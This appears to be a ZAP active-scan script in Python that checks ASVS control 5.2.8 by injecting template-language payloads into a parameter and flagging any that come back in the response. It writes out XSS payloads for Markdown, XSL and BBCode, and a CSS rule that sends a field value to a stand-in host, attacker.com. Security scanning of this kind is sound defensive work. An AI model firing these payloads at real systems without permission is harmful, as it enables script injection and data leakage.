"""

Script testing 5.2.8 control from OWASP ASVS 4.0:
'Verify that the application sanitizes, disables, or sandboxes user-supplied scriptable or expression 
template language content, such as Markdown, CSS or XSL stylesheets, BBCode, or similar.'

"""

def scanNode(sas, msg):
  pass

def scan(sas, msg, param, value):
  #alert parameters
  alertRisk= 0
  alertConfidence = 1
  alertTitle = "5.2.8 Verify that the application sanitizes, disables, or sandboxes template language content."
  alertDescription = "Verify that the application sanitizes, disables, or sandboxes user-supplied scriptable or expression template language content, such as Markdown, CSS or XSL stylesheets, BBCode, or similar."
  url = msg.getRequestHeader().getURI().toString()
  alertParam = ""
  alertAttack = ""
  alertInfo = ""
  alertSolution = ""
  alertEvidence = "" 
  cweID = 94
  wascID = 0

  markdown = ('Markdown', '[a](javascript:alert(1))')
  css = ('CSS', 'input[name="id"]{ background: url(https://attacker.com/log?value=id);}')
  xsl = ('XSL', '<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"> <xsl:template match="/"> <script>alert(1)</script> </xsl:template> </xsl:stylesheet>')
  bbcode = ('BBCode', '[color=#ff0000;xss:expression(alert(String.fromCharCode(88,83,83)));]XSS[/color]')



  attacks = [markdown, css, xsl, bbcode]

  msg = msg.cloneRequest();

  for pair in attacks:
    attack = pair[1]
  
    # setParam (message, parameterName, newValue)
    sas.setParam(msg, param, attack);

    # sendAndReceive(msg, followRedirect, handleAntiCSRFtoken)
    sas.sendAndReceive(msg, False, False);
  
    # Test the responses and raise alerts as below
    if (attack in str(msg.getResponseBody())):
      alertInfo = pair[0]
      alertAttack = attack
      alertEvidence = attack + " in Response Body"
      sas.raiseAlert(alertRisk, alertConfidence, alertTitle, alertDescription, 
      url, alertParam, alertAttack, alertInfo, alertSolution, alertEvidence, cweID, wascID, msg);

